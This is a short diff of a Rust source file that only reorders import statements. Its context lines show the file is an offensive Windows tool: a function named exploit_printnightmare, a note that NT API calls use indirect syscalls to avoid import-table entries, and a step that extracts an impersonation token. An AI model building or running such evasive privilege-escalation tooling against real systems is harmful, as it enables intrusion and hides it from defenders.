@@ -27,8 +27,8 @@
 //!
 //! All NT API calls use indirect syscalls — no IAT entries.
 
-use anyhow::{anyhow, Context, Result};
 use crate::win_types::HANDLE;
+use anyhow::{anyhow, Context, Result};
 
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
@@ -475,8 +475,10 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
 
     // ── 7. Extract token ─────────────────────────────────────────────────
     let token_result = if got_connection {
-        use windows_sys::Win32::Security::{TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY};
         use windows_sys::Win32::Security::TokenImpersonation;
+        use windows_sys::Win32::Security::{
+            TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
+        };
         let token = unsafe {
             // NtOpenThreadToken on the impersonation thread
             let mut tok: HANDLE = std::ptr::null_mut();
